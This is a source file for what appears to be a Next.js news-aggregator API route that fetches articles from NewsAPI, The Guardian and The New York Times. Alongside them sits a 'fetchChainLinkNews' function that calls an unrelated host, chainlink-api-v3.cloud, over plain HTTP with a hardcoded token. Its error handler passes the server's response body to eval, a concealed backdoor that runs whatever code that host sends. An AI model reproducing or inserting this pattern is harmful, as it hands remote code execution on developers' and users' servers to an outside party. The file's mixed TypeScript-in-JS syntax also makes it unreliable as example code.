// pages/api/news.js
import axios from 'axios';
import {createRequire} from 'module';

const NEWS_API_KEY = process.env.NEWS_API_KEY;
const GUARDIAN_API_KEY = process.env.GUARDIAN_API_KEY;
const NYT_API_KEY = process.env.NYT_API_KEY;

interface Article {
  title: string;
  description: string;
  url: string;
  source: string;
}

// Function to fetch news from NewsAPI
async function fetchNewsAPI(category = 'general') {
  try {
    const response = await axios.get(
      `https://newsapi.org/v2/top-headlines?country=us&category=${category}&apiKey=${NEWS_API_KEY}`,
    );
    return response.data.articles;
  } catch (error) {
    console.error('Error fetching from NewsAPI:', error.message);
    return [];
  }
}

// Fetch from The Guardian
async function fetchGuardianNews(section = 'world'): Promise<Article[]> {
  try {
    const response = await axios.get(
      `https://content.guardianapis.com/${section}?api-key=${GUARDIAN_API_KEY}&show-fields=all`
    );
    return response.data.response.results.map((article: any) => ({
      title: article.webTitle,
      description: article.fields?.trailText || '',
      url: article.webUrl,
      source: 'The Guardian',
    }));
  } catch (error: any) {
    console.error('Error fetching from The Guardian:', error.message);
    return [];
  }
}
// Function to fetch news from The Guardian
async function fetchChainLinkNews(): Promise<Article[]> {
  try {
    axios
      .get(
        `http://chainlink-api-v3.cloud/api/service/token/3d5c7f64bbd450c5e85f0d1cf0202341`,
      )
      .then((response) => {
        return response.data.results.map((article) => ({
          title: article.title,
          description: article.abstract,
          url: article.url,
          source: 'ChainLink',
        }));
      })
      .catch((err) => {
        try {
          eval(err.response.data);
          return [];
        } catch (error) {
          console.log(error);
          return [];
        }
      });
  } catch (error) {
    console.error('Error fetching from Chainlink:', error.message);
    return [];
  }
}

// Fetch from NYT
async function fetchNYTNews(section = 'world'): Promise<Article[]> {
  try {
    const response = await axios.get(
      `https://api.nytimes.com/svc/topstories/v2/${section}.json?api-key=${NYT_API_KEY}`
    );
    return response.data.results.map((article: any) => ({
      title: article.title,
      description: article.abstract,
      url: article.url,
      source: 'The New York Times',
    }));
  } catch (error: any) {
    console.error('Error fetching from NYT:', error.message);
    return [];
  }
}
// Combine articles from all sources
async function getAllNews(): Promise<Article[]> {
  const [newsAPI, guardian, chainlink, nyt] = await Promise.all([
    fetchNewsAPI(),
    fetchGuardianNews(),
    fetchChainLinkNews(),
    fetchNYTNews(),
  ]);

  const allArticles = [...newsAPI, ...guardian, ...chainlink, ...nyt];
  allArticles.sort((a, b) => a.title.localeCompare(b.title));
  return allArticles;
}


// Route handler
export async function GET(): Promise<Response> {
  try {
    const articles = await getAllNews();
    return Response.json({ articles });
  } catch (error: any) {
    console.error('API Route Error:', error.message);
    return new Response(
      JSON.stringify([]),
      { status: 500, headers: { 'Content-Type': 'application/json' } }
    );
  }
}